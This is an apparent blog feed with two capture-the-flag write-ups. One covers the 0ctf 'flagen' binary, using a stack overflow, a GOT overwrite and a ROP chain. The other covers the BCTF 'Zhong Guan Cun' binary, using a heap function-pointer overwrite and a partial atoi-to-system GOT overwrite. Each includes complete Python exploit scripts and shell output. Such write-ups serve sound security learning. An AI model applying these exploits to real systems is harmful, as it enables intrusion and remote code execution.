<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-03-30T20:15:08+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[0ctf - Flagen]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/"/>
    <updated>2015-03-30T19:32:07+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-flagen</id>
    <content type="html"><![CDATA[<p>0ctf sported a number of challenges and I was happy to grab a few flags. Here&rsquo;s how we solved <code>flagen</code>.</p>

<!-- more -->


<p><code>flagen</code> is a 32-bit ELF, and we&rsquo;re also given the corresponding <code>libc</code> library. It functions as a flag generator, which can perform various functions on the input:</p>

<pre><code>== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
</code></pre>

<p>We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is <code>leetify</code>, because this takes the input and transforms it to leet-speak:</p>

<pre><code>== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 1
Hello World!
Done.
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 4
Done.
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 6
The Flag is: 1-13110 W0r1d!
Done.
</code></pre>

<p>There are several transformations done, but most importantly, the <code>H</code> is translated into <code>1-1</code>. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times <code>H</code> and then asking it to perform <code>leetify</code>, the program generates a segmentation fault.</p>

<h2>Narrowing down</h2>

<p>After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of <code>H</code> bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it&rsquo;s time to get creative.</p>

<p>The epilogue of the vulnerable function looks like this:</p>

<pre><code>8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
8048ae1: mov    DWORD PTR [esp],eax
8048ae4: call   80484f0 &lt;strcpy@plt&gt;
8048ae9: mov    eax,DWORD PTR [ebp-0xc]
8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
8048af3: je     8048afa &lt;atoi@plt+0x59a&gt;
8048af5: call   80484e0 &lt;__stack_chk_fail@plt&gt; ; terminate if canary is overwritten
8048afa: add    esp,0x124
8048b00: pop    edi
8048b01: pop    ebp
8048b02: ret    
</code></pre>

<p>Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will <em>always</em> call <code>stack_chk_fail</code> and terminate. Luckily, <code>stack_chk_fail</code> is an imported function, which means we can overwrite its GOT entry with the hijacked <code>strcpy</code>! This will lead to control over <code>eip</code>. Just one final hurdle&hellip;</p>

<h2>ROP it likes it&rsquo;s hot</h2>

<p>NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice <code>add esp, 0x1c; pop pop pop pop ret</code> gadget and decided to overwrite <code>stack_chk_fail</code> with that address. This will pivot <code>esp</code> into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of <code>read</code> to make it point to <code>system</code>. Then, write out the string <code>sh;</code> in memory and using that as an argument for <code>system</code>.</p>

<p>To make this happen, I just two more gadgets:</p>

<pre><code class="python"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
# 0x08048aff : add [edi + 0x5d], bl; ret
</code></pre>

<p>With the first gadget, I could control the values of various registers, provided there are no bad chars. <code>0x00</code> is obviously bad, but remember, we pass the buffer to <code>leetify</code>: it will mangle chars like <code>H</code> and <code>s</code>! These must also be avoided, which is why the ROP chain builds the characters <code>s</code> and <code>h</code> in two parts in memory.</p>

<p>The second gadget allows me to adjust values. Because <code>libc</code> is given, the output of <code>nm -D ./libc.so.6</code> could be grepped for <code>system</code> and <code>read</code>. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out <code>sh;</code> into an empty piece of GOT memory. Finally, ret2system via <code>read@plt</code> and pop a shell!</p>

<p>The final exploit:</p>

<pre><code class="python">from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.28.115', 5149))

    raw_input()

    readtil('choice: ')
    sendln('1')     # input flag

    # gadgets 
    # 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
    # 0x08048aff : add [edi + 0x5d], bl; ret

    # start building the ropchain
    payload = ''
    # 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain
    payload += p(0x8048d89) 
    payload += '0000'*2 # junk

    # from libc.6.so:
    # 00040190 W system
    # 000dabd0 W read

    ### first byte
    payload += p(0x08048d8c)
    payload += p(0xffffffc0)    # ebx, lower byte is important read -&gt; system (0xd0 + 0xc0 = 0x190)
    payload += p(-1)            # esi
    payload += p(0x804b00c-0x5d)        # edi -&gt; read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### second byte
    payload += p(0x08048d8c)
    payload += p(0xffffff56)    # ebx, lower byte is important read -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
    payload += p(-1)            # esi
    payload += p(0x804b00d-0x5d)        # edi -&gt; read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### third byte
    payload += p(0x08048d8c)
    payload += p(0xfffffff7)    # ebx, lower byte is important sprintf -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
    payload += p(-1)            # esi
    payload += p(0x804b00e-0x5d)        # edi -&gt; read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff

    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff39)    # ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)
    payload += p(-1)            # esi
    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    payload += p(0x08048d8c)
    payload += p(0xffffff3a)    # ebx, 3a 
    payload += p(-1)            # esi
    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff34)    # ebx, 68 == h
    payload += p(-1)            # esi
    payload += p(0x0804b200-0x5d)       # edi -&gt; buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    payload += p(0x08048aff)    # 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == 'h'
    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff3b)    # ebx, 3b == ;
    payload += p(-1)            # esi
    payload += p(0x0804b201-0x5d)       # edi -&gt; buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ###
    payload += p(0x80484a0)     # read@plt -&gt; points to system()
    payload += '1111'           # fake ret addr
    payload += p(0x0804b1ff)    # pointer to 'sh;'

    ropchain_length = len(payload)
    adjust_with_H = ((276-len(payload))/3)

    payload += 'H' * adjust_with_H  # add the correct amount of H's needed for the overflow; the pointer for strcpy() is at esp+276
    payload += 'A' * (276-ropchain_length-adjust_with_H*3) # how many A bytes do we need to make up the buffer to exactly 276 bytes?
    payload += p(0x804b01c) # point the strcpy to this address: stack_chk_fail@got &gt;;]

    sendln(payload)

    readtil('choice: ')
    sendln('4')     # leetify

    print "[+] enjoy your shell!"

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
</code></pre>

<pre><code>bas@tritonal:~/tmp/0ctf/flagen$ python ./exploit.py 

[+] enjoy your shell!
id
uid=1001(flagen) gid=1001(flagen) groups=1001(flagen)
whoami
flagen
cat /home/flagen/flag
0ctf{delicious_stack_cookie_generates_flag}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[After the Fact - BCTF Zhong Guan Cun Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/"/>
    <updated>2015-03-23T18:55:51+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup</id>
    <content type="html"><![CDATA[<p>We&rsquo;re entering a CTF almost every weekend now, but they&rsquo;ve been really tough. I did not manage to exploit this challenge in time, but one day after the CTF ended I had an epiphany and got my exploit working. I figured I&rsquo;d share how I approached this challenge for future reference.</p>

<!-- more -->


<p>For this pwnable, called <code>Zhong guan cun</code>, we&rsquo;re given a 32-bit ELF binary and libraries. The task is to exploit it remotely and grab a flag. As said, I did not manage to grab the flag, but I got the exploit working locally.</p>

<p>The binary represents some kind of online store testing program, where we&rsquo;re able to set a name and add items to the shop. Then, we can try out said shop, buying the items and asking for wholesale prices. We <em>cannot</em> modify any entry, nor delete anything after we&rsquo;ve set it.</p>

<p>Playing around with the binary a bit, I noticed that it immediately quit when attempting to overflow a buffer.</p>

<pre><code class="bash">*********************************
*** Welcome to Zhong Guan Cun ***
*********************************
Are you dreaming of becoming a Milli$_$naire?
Come to sell some electronics!

a) Register my store
b) Try my store
c) Exit
Your choice? a
What's the name of your store? BLEH
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? a
Phone's name? PHONE1
1) Android OS
2) iOS
3) Windows OS
4) Blackberry OS
5) Symbian OS
Choose Phone's OS? 1
Phone's price? 99999999999
Phone's description? PHONE1
New phone added successfully!
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? c
&lt;&lt;&lt; Store Name: BLEH &gt;&gt;&gt;
=== Items in the store ===
1) Android OS Phone PHONE1 price: 2147483647 CNY description: PHONE1
Congraz! Your store menu is generated successfully!
a) Sell a phone
b) Sell a watch
c) Generate a store menu
d) Return to main menu
Your choice? AAAAAAAAAAAAAAAAAAAAAAAAA
Input is Too Long.
$
</code></pre>

<p>I reversed the item struct. The items are stored on the heap and we can&rsquo;t have more than 16 items in total.</p>

<pre><code>                .-- ptr to two function addresses
                |             .-- start of phone/watch name, 0x20 bytes long
                v             v
0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
0x8257018:  0x41414141  0x41414141  0x41414141  0x41414141
                              .-- start of phone/watch description, 0x50 bytes long
                              v
0x8257028:  0x00414141  0x42424242  0x42424242  0x42424242
0x8257038:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257048:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257058:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257068:  0x42424242  0x42424242  0x42424242  0x42424242
0x8257078:  0x00424242  0x000003e8
                              ^
                              `-- price
</code></pre>

<p>After finding the function that reads in the input, I tried to find an overflow or off-by-one vulnerability, but everything was locked down tight. There was, however, another thing that caught my attention.</p>

<h2>Heaps of fun</h2>

<p>We have to corrupt some piece of memory somewhere, but the items themselves are not going to cut it. We do, however, have control over the store menu string. This turned out to be the key. If I first added an item, then generated the store menu string and finally added a second item, the layout of the items and store menu on the heap was like this:</p>

<pre><code>gdb-peda$ x/20wx 0x804b300
              .-- ptr to store menu string
              v
0x804b300:  0x0804c088  0x00000000  0x00000000  0x00000000
0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b340:  0x0804c008  0x0804cbb8  0x00000000  0x00000000
              ^           ^
              `-- item1   |
                          `-- item2
    e.g. item1 | store_menu | item2
</code></pre>

<p>The store description string was in between the items on the stack. The items contained a pointer to two function address:</p>

<pre><code>                .-- ptr to two function addresses
                |             .-- start of phone/watch name, 0x20 bytes long
                v             v
0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
                   ^
                   |
                   `--- this value points to two functions:
gdb-peda$ x/2wx 0x08049b70
0x8049b70:  0x08049466  0x080492fe
</code></pre>

<p>If I could somehow overwrite that pointer of an item by overflowing the store description string, I could possible get code execution (it was nowhere near that easy, but bear with me). I started trying to generate large items, and indeed, I could overflow the function pointer of the second item using large inputs. The trick was to also set the price to a negative value, giving me just enough bytes to overflow. I whipped up a poc python script to do this for me. The layout and some functions of this poc are heavily inspired by <a href="https://gist.github.com/saelo/9e6934b3c40cf42e3f87">saelo</a>!</p>

<pre><code class="python">from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))

    # pause to allow gdb to attach
    raw_input()

    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!

    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)

    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    readtil('choice?')
    sendln('c')

    # second item, will be allocated after the store menu string
    # this is the one whose function pointer we will corrupt
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('9'*0xf) # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    sendln('B'*0x4f) 

    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')     # sell a phone
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe) # for these, we'll need the minus sign.
        readtil('description?')
        sendln('B'*0x4f)    

    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*(0x4f-4)+'CCCC')     # overflow with 0x43434343

    readtil('choice?')
    sendln('c') # generate store menu &amp; overflow; 2nd item now points to 0x43434343

    raw_input()
pwn()
</code></pre>

<p>And in action:</p>

<pre><code>gdb-peda$ x/40x 0x804b300
0x804b300:  0x08a50088  0x00000000  0x00000000  0x00000000
0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b340:  0x08a50008  0x08a50ba8  0x08a50c28  0x08a50ca8
0x804b350:  0x08a50d28  0x08a50da8  0x08a50e28  0x08a50ea8
0x804b360:  0x08a50f28  0x08a50fa8  0x08a51028  0x08a510a8
0x804b370:  0x08a51128  0x08a511a8  0x08a51228  0x08a512a8
0x804b380:  0x00000000  0x00000000  0x00000000  0x00000000
0x804b390:  0x00000000  0x00000000  0x00000000  0x00000000

# let's have a look at the second item:

gdb-peda$ x/40wx 0x08a50ba8
            .-- now overwritten!
            v
0x8a50ba8:  0x43434343  0x41414100  0x41414141  0x41414141
0x8a50bb8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50bc8:  0x00414141  0x04b03741  0x41414108  0x41414141
0x8a50bd8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50be8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50bf8:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50c08:  0x41414141  0x41414141  0x41414141  0x41414141
0x8a50c18:  0x00414141  0x7fffffff  0x00000003  0x00000081
            .-- normal pointer
            v
0x8a50c28:  0x08049b70  0x41414141  0x41414141  0x41414141
0x8a50c38:  0x41414141  0x41414141  0x41414141  0x41414141
</code></pre>

<p>I was ready to rock &amp; roll! I dumped in an address of a gadget, hoping to get code execution. There were, however, two small problems. First, the binary takes the pointer stored at the start of the item struct and then derefences it to get a second pointer to a function:</p>

<pre><code>;;; triggered when asking for a wholesale price
 8048fdd: call   804897b &lt;exit@plt+0x1ab&gt;    ; this call will be important in a few moments
 8048fe2: pop    eax                         ; 
 8048fe3: pop    edx                         ;
 8048fe4: mov    eax,DWORD PTR [esi]         ; esi is *item, so this loads 0x08049b70 into eax
 8048fe6: push   edi                         ; input for function
 8048fe7: push   esi                         ; 
 8048fe8: call   DWORD PTR [eax]             ; this derefences 0x08049b70, effectively calling 0x08049466
</code></pre>

<p>So I needed to have a pointer to a pointer on the heap. I had no way of leaking the heap address yet. I tried to overflow using the address of a got pointer so I could use <code>sprintf</code> to leak further information, but then the function at <code>0x8048fdd</code> reared its ugly head:</p>

<pre><code> ;; strange function, opens /dev/zero, tries to read one byte and then closes it
 804897b: push   ebp
 804897c: mov    ebp,esp
 804897e: push   esi
 804897f: push   ebx
 8048980: push   edx
 8048981: push   edx
 8048982: push   0x0
 8048984: push   0x80495ce                 ; /dev/zero
 8048989: mov    esi,DWORD PTR [ebp+0x8]
 804898c: call   80486d0 &lt;open@plt&gt;
 8048991: add    esp,0x10
 8048994: test   eax,eax
 8048996: mov    ebx,eax
 8048998: jns    80489a4 &lt;exit@plt+0x1d4&gt;
 804899a: sub    esp,0xc
 804899d: push   0x1
 804899f: call   80487d0 &lt;exit@plt&gt;
 80489a4: push   eax
 80489a5: push   0x1
 80489a7: push   DWORD PTR [esi]           ; read *buf =0x8049b70
 80489a9: push   ebx
 80489aa: call   8048750 &lt;read@plt&gt;        ; read one byte into non-readable buffer, huh?
 80489af: add    esp,0x10
 80489b2: dec    eax                       ; eax = -1, of course
 80489b3: je     804899a &lt;exit@plt+0x1ca&gt;  ; if eax was zero, the program would exit() --&gt; protection against rwxp?
 80489b5: mov    DWORD PTR [ebp+0x8],ebx   ; ebx = fd
 80489b8: lea    esp,[ebp-0x8]
 80489bb: pop    ebx
 80489bc: pop    esi
 80489bd: pop    ebp
 80489be: jmp    8048790 &lt;close@plt&gt;
</code></pre>

<p>I didn&rsquo;t see it at first, until I overwrote the function pointer in the item struct with a got address. This address is readable and writeable. This function then tries to read a byte from <code>/dev/zero</code> into the function pointer. If it fails, no problem, execution will happily continue. If it succeeds, however, it will immediately halt execution of the binary. I was in trouble!</p>

<p>I could not call imported functions from the got, nor could I just find any old gadget. Because of the dereferencing, the address of the gadget had to be present in the binary in a non-writeable section!</p>

<p>Finally, I turned to a function that was already in the binary, used for watches:</p>

<pre><code>gdb-peda$ x/2wx 0x8049b60
0x8049b60:  0x0804935e  0x0804932e
</code></pre>

<p>The first function is called when asking for a wholesale price. However, the second function at <code>0x0804932e</code> is used in the generation of the store menu.</p>

<h2>Tricky overflow</h2>

<p>That function at <code>0x0804932e</code> looks like this:</p>

<pre><code> 804932e: push   ebp
 804932f: mov    ebp,esp
 8049331: sub    esp,0x10
 8049334: mov    eax,DWORD PTR [ebp+0x8]
 8049337: lea    edx,[eax+0x24]
 804933a: push   edx
 804933b: lea    edx,[eax+0x4]                   ; name
 804933e: push   DWORD PTR [eax+0x74]            ; price
 8049341: push   edx                             ; description
 8049342: imul   eax,DWORD PTR [eax+0x78],0x14   ; type of watch
 8049346: add    eax,0x804b140
 804934b: push   eax
 804934c: push   0x80495aa                       ; format string
 8049351: push   DWORD PTR [ebp+0xc]             ; char *buffer: ATTACKER-SUPPLIED!
 8049354: call   80486c0 &lt;sprintf@plt&gt;
 8049359: add    esp,0x20
 804935c: leave  
 804935d: ret    
</code></pre>

<p>I chose to overwrite the function pointer in the item struct with  with <code>0x8049b64</code>. This causes the program to call <code>0x804932e</code> instead of the &lsquo;get wholesale price&rsquo;-function <strong>with an attacker supplied argument</strong>. This will allow me to overwrite a piece of memory with the generated string. If I set the description or name of an item correctly and I applied a correct offset, I could overwrite anything I want. There was some collateral damage to surrounding memory, however, making it impossible to overwrite a got pointer directly. The program contains another puzzle piece and I wanted to gain control over that instead.</p>

<h2>Going for the big bucks</h2>

<p>On the heap was an integer (or DWORD) that holds the amount of money that the simulated store customer has. The program substracts from this amount when a purchase is done, making it potentially a write-primitive. The <em>pointer</em> to this heap address lives at <code>0x804b280</code>. I wanted to overwrite this pointer with the address of <code>atoi@got</code>. Then, I would be able to update the pointer at <code>atoi@got</code>. Why <code>atoi</code>? Because it also uses one argument, just like <code>system</code>. If I could make <code>atoi</code> point to <code>system</code>, I had an easy way of spawning a shell. I modified the poc to do this:</p>

<pre><code>from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))
    #s.connect(('146.148.60.107', 6666))

    # pause to allow gdb to attach
    raw_input()

    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    # store name; maximum allowed, need it to overflow a buffer later!
    sendln("S"*63)  

    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)

    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    # overflow such that the store description will overwrite the second item's function pointer
    readtil('choice?')
    sendln('c')

    # second item
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    # use this later to overwrite the ptr to the money DWORD
    sendln('A'+p(0x804b038)+'A'*(0x4f-5)) # 0x804b038 = atoi@got

    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe)
        readtil('description?')
        sendln('B'*0x4f)    

    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    # 0x8049b64 is a pointer to 0x0804932e
    sendln('B'*(0x4f-4)+p(0x8049b64)) 

    # generate store menu &amp; overflow; 2nd item now points to 0x8049b64: 0x0804932e -&gt; sprintf function, used to overwrite ptr to money
    readtil('choice?')
    sendln('c') 

    readtil('choice?')
    sendln('d')
    readtil('choice?')
    sendln('b')
    print readtil('buy?')
    sendln('2')
    readtil('choice?')
    # get wholesale price, trigger function 0x0804932e
    sendln('b') 
    readtil('buy?')
    # this value is used as an argument for 0x0804932e, conveniently translated for us by atoi!
    # it is 0x804b280-51, so that the output of sprintf is aligned and will overwrite the money pointer with the address of atoi@got
    sendln('134525517') 
    readtil('choice?')

    # ok, now have control over ptr to money!
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
</code></pre>

<p>This allowed me to write to <code>atoi@got</code>! Or so I thought. The problem is that <code>atoi@got</code> contains <code>0xf74e2880</code>, which is atoi in libc. This number is interpreted by the program as a negative amount of money. When trying to modify the value at <code>atoi@got</code>, the value it contains is passed via this block of code:</p>

<pre><code> 8048f6b: mov    edx,DWORD PTR ds:0x804b280 ; grab location of money DWORD from money pointer (it will point to atoi@got)
 8048f71: imul   eax,DWORD PTR [esi+0x74]   ; eax contains amount of item to buy, multiply it by price of item
 8048f75: mov    ecx,DWORD PTR [edx]        ; grab money amount
 8048f77: sub    ecx,eax                    ; subtract cost from amount of money
 8048f79: js     8049008 &lt;exit@plt+0x838&gt;   ; jump-if-sign: if the amount of leftover money is negative, abort the transaction!
</code></pre>

<p>Since I needed to modify <code>atoi</code> (0xf74e2880) to <code>system</code> (0xf74f0c30), this <code>sub ecx,eax / js</code> block above would <em>never</em> let me modify the pointer in the global offset table to <code>system</code>. Looking back, the solution is easy, but I could not figure it out late at night.</p>

<h2>Take one step back</h2>

<p>After the CTF had ended, it dawned on me: I did not have to modify the got pointer of <code>atoi</code> completely, I could modify <em>part</em> of it! After all, if I move one byte back, the value I would be modifying would be <code>0x4f0c30xx</code>; this is still a positive number! Of course, it is possible that <code>atoi</code> is located at an address such as <code>0xf7dff880</code>; in this case, it still would not work.</p>

<p>I updated the poc once more, to make the money object point to <code>atoi@got-1</code>. I needed to add 0x50dc3000-0x4ff88000 = 14921728 to atoi so that it points to system (at least, locally, on my box). This is done by buying item 2. It&rsquo;s price is set to <code>0x7fffffff</code>. Multiplying that by 14921728 gives an integer overflow to 0xff1c5000. The latter value will be subtracted from the value at atoi-1, conveniently updating the right portion of atoi!</p>

<pre><code class="python">from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('localhost', 6666))
    #s.connect(('146.148.60.107', 6666))

    # pause to allow gdb to attach
    raw_input()

    # register store
    readtil('choice?')
    sendln('a')     
    readtil('store?')
    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!

    # the program *needs* to have an item to sell before it can generate a store menu
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*0x4f)

    # generate store menu. this will be 0xb20 bytes large, on the heap. 
    readtil('choice?')
    sendln('c')

    # second item
    readtil('choice?')
    sendln('a')     # sell a phone
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
    readtil('description?')
    sendln('A'+p(0x804b038-1)+'A'*(0x4f-5)) # 0x804b038 = atoi@got 

    # allocate the rest of the items
    for i in range(13):
        readtil('choice?')
        sendln('a')     # sell a phone
        readtil('name?')
        sendln('A'*0x1f)
        readtil('OS?')
        sendln('4')
        readtil('price?')
        sendln('-'+'9'*0xe)
        readtil('description?')
        sendln('B'*0x4f)    

    # overflow
    readtil('choice?')
    sendln('a')
    readtil('name?')
    sendln('A'*0x1f)
    readtil('OS?')
    sendln('4')
    readtil('price?')
    sendln('-'+'9'*0xe)
    readtil('description?')
    sendln('B'*(0x4f-4)+p(0x8049b64))

    readtil('choice?')
    sendln('c') # generate store menu &amp; overflow into 2nd item

    readtil('choice?')
    sendln('d')
    readtil('choice?')
    sendln('b')
    print readtil('buy?')
    sendln('2')
    readtil('choice?')
    sendln('b') # get wholesale price
    readtil('buy?')
    sendln('134525517') # is 0x804b280-51, so that the sprintf is aligned and will overwrite the money pointer with atoi@got or snprintf@got
    readtil('choice?')
    sendln('a')
    readtil('buy?')
    sendln('14921728')  # this is the offset of atoi to system on *my* box, 58288*256 (the *256 is to compensate for the crooked ptr)
    readtil('choice?')
    sendln('a')
    readtil('buy?')
    sendln('/bin/sh;')

    # ok, should have a shell by now!
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
</code></pre>

<p>The binary is running locally via <code>socat</code>. Running the python script lands a shell:</p>

<pre><code class="bash">bas@tritonal:~/tmp/bctf/zhonguancun$ python ./zhong.py

 &lt;&lt;&lt; Store Name: SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &gt;&gt;&gt;
...snip...
15) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
16) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBd�
Your total money: 100000 CNY.
What do you want to buy?
 whoami
bas
uname -a
Linux tritonal 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1+deb7u2 x86_64 GNU/Linux
</code></pre>

<p>Unfortunately, a day too late for the CTF.</p>

<h2>Conclusion</h2>

<p>I had found nearly all the puzzle pieces, yet missed the final small piece. For the next CTF, I will Try Harder!</p>
]]></content>
